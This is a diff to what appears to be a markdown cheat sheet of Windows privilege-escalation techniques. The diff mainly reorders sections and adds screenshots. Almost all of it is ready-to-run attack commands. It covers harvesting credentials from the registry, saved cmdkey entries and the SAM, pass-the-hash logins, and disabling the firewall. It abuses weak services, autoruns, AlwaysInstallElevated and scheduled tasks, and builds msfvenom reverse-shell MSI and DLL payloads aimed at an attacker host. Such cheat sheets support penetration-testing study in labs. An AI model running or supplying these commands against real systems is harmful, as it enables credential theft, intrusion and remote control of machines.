@@ -1103,6 +1103,10 @@ service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off')
 
 #### Credential Access
 
+#### Credentials from Registry
+
+![image](https://user-images.githubusercontent.com/59018247/198097491-7654e719-20ab-4bda-b490-a2880e33486f.png)
+
 ```ps1
 #######################################################################
 ##### 1. Credentials from registry ####################################
@@ -1120,7 +1124,13 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
 # On Kali, we can use the winexe command to spawn a shell using these credentials
 winexe -U '{USER}%{PASS}' //{RHOST} cmd.exe
+```
+#### Credentials from Saved Creds (cmdkey)
 
+![image](https://user-images.githubusercontent.com/59018247/198099404-4aac358c-327f-48be-a585-adea1ad9541c.png)
+![image](https://user-images.githubusercontent.com/59018247/198099491-39701046-651e-431f-93cc-2fb2b253db25.png)
+
+```ps1
 
 #########################################################################
 #### 2. Credentials from cmdkey #########################################
@@ -1137,7 +1147,9 @@ C:\PrivEsc\savecred.bat
 
 # We can use the saved credential to run any command as the admin user
 runas /savecred /user:{admin} {C:\PrivEsc\reverse.exe}
+```
 
+```ps1
 #########################################################################
 #### 3. Credentials from configuration files ############################
 #########################################################################
@@ -1150,7 +1162,13 @@ dir /s *pass* == *.config
 
 # Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt
 findstr /si password *.xml *.ini *.txt
+```
 
+#### SAM Creds
+
+![image](https://user-images.githubusercontent.com/59018247/198099701-4455e707-8019-46df-9d2d-e0b568db772a.png)
+
+```ps1
 #########################################################################
 #### 4. Credentials from SAM ############################################
 #########################################################################
@@ -1179,6 +1197,8 @@ pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc
 
 #### Exploits
 
+![image](https://user-images.githubusercontent.com/59018247/198102350-3ab06bfe-107d-49a0-9658-a3a56cc915cf.png)
+
 <br />
 
 [Windows Expoit Suggestor](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
@@ -1201,9 +1221,13 @@ python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 
 ##### Services
 
+##### Insecure Service Permissions
+
+![image](https://user-images.githubusercontent.com/59018247/198094466-ee09d600-838a-40b8-b97c-10587e42d306.png)
+
 ```ps1
 #########################################################################
-#### 1. Insecure Service Properties #####################################
+#### Insecure Service Permissions #####################################
 #########################################################################
 
 # Winpeas Enumeration
@@ -1223,9 +1247,15 @@ config {SERVICE} binpath= "\"C:\{PAYLOAD PATH}\""
 
 # Start a service:
 net start {SERVICE}
+```
+#### Unquoted Service Path
 
+![image](https://user-images.githubusercontent.com/59018247/198094944-1b83a728-8b11-49de-b3fd-00e4597565ee.png)
+![image](https://user-images.githubusercontent.com/59018247/198095088-b72a4906-98e7-4f9b-b75e-b82add5eff1f.png)
+
+```ps1
 #########################################################################
-##### 2. Unquoted Service Path ##########################################
+##### Unquoted Service Path ##########################################
 #########################################################################
 
 # Winpeas Enumeration
@@ -1242,9 +1272,16 @@ copy reverse.exe {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\Commo
 
 # Start a service:
 net start {SERVICE}
+```
 
+
+#### Weak Registry Permissions
+
+![image](https://user-images.githubusercontent.com/59018247/198095341-9b111099-af90-464d-bec7-fe4913f45695.png)
+
+```ps1
 #########################################################################
-#### 3. Weak Registry Permissions #######################################
+#### Weak Registry Permissions #######################################
 #########################################################################
 
 # Winpeas Enumeration
@@ -1269,10 +1306,16 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 
 # Start the service:
 net start regsvc
+```
 
+#### Insecure Service Executables
 
+![image](https://user-images.githubusercontent.com/59018247/198094944-1b83a728-8b11-49de-b3fd-00e4597565ee.png)
+![image](https://user-images.githubusercontent.com/59018247/198095810-c5c79f01-c9da-4887-8081-8360bb7f5a02.png)
+
+```ps1
 #########################################################################
-##### 4. Insecure Service Executables (File Permissions: Everyone) ######
+##### Insecure Service Executables  ####################################
 #########################################################################
 
 # Winpeas Enumeration
@@ -1293,9 +1336,90 @@ Rename-Item "C:\Program Files\Microvirt\MEmu\MemuService.exe" "C:\Program Files\
 # Start the service
 net start filepermsvc
 Restart-Computer
+```
 
+<br />
+
+#### AutoRuns
+
+![image](https://user-images.githubusercontent.com/59018247/198096274-fcc62333-4817-4e6a-9567-49485d6d5106.png)
+![image](https://user-images.githubusercontent.com/59018247/198096384-aeadace5-4245-437e-a7d5-9272e86d4a2b.png)
+
+```ps1
 #########################################################################
-#### 5. DLL Hijacking ###################################################
+#### AutoRuns ########################################################
+#########################################################################
+
+# Requires computer restart for priv esc.
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet applicationsinfo
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# Use accesschk.exe to verify the permissions on each one
+.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+# Copy our reverse shell executable to overwrite the AutoRun executable:
+copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+```
+
+##### Always Install Elevated
+
+![image](https://user-images.githubusercontent.com/59018247/198085925-00b477ac-15ec-40f0-9910-abc520f47ab2.png)
+
+```ps1
+#########################################################################
+#### AlwaysInstallElevated ###########################################
+#########################################################################
+
+# Winpeas Enumeration to see if both registry values are set
+.\winPEASany.exe quiet windowscreds
+
+# Manual Enumeration
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o reverse.msi
+
+# Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit
+msiexec /quiet /qn /i C:\users\public\downloads\reverse.msi
+
+```
+
+<br />
+
+##### Scheduled Tasks
+
+#### Scheduled Tasks
+
+![image](https://user-images.githubusercontent.com/59018247/198100333-fe96afc9-af79-49ba-81e8-51a2a8618670.png)
+
+```ps1
+#########################################################################
+#### Scheduled Tasks #################################################
+#########################################################################
+
+# Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account. Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
+
+# List all scheduled tasks your user can see:
+schtasks /query /fo LIST /v
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+# Inspect interesting scripts
+type C:\DevTools\CleanUp.ps1
+
+# Check Permissions for write access on script
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+# Use echo to append a call to our reverse shell executable to the end of the script
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+
+```ps1
+#########################################################################
+#### DLL Hijacking ###################################################
 #########################################################################
 
 # Winpeas Enumeration
@@ -1327,81 +1451,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} -f dll
 net stop dllsvc
 net start dllsvc
 ```
-
-<br />
-
-##### AutoRuns
-
-```ps1
-#########################################################################
-#### 1. AutoRuns ########################################################
-#########################################################################
-
-# Requires computer restart for priv esc.
-
-# Winpeas Enumeration
-.\winPEASany.exe quiet applicationsinfo
-
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-
-# Use accesschk.exe to verify the permissions on each one
-.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
-
-# Copy our reverse shell executable to overwrite the AutoRun executable:
-copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
-```
-
-##### Always Install Elevated
-
-![image](https://user-images.githubusercontent.com/59018247/198085925-00b477ac-15ec-40f0-9910-abc520f47ab2.png)
-
-```ps1
-#########################################################################
-#### 2. AlwaysInstallElevated ###########################################
-#########################################################################
-
-# Winpeas Enumeration to see if both registry values are set
-.\winPEASany.exe quiet windowscreds
-
-# Manual Enumeration
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-# Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension
-msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o reverse.msi
-
-# Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit
-msiexec /quiet /qn /i C:\users\public\downloads\reverse.msi
-
-```
-
-<br />
-
-##### Scheduled Tasks
-
-```ps1
-
-#########################################################################
-#### 1. Scheduled Tasks #################################################
-#########################################################################
-
-# Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account. Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
-
-# List all scheduled tasks your user can see:
-schtasks /query /fo LIST /v
-PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
-
-# Inspect interesting scripts
-type C:\DevTools\CleanUp.ps1
-
-# Check Permissions for write access on script
-C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
-
-# Use echo to append a call to our reverse shell executable to the end of the script
-echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
-
-```
-
 <br />
 
 
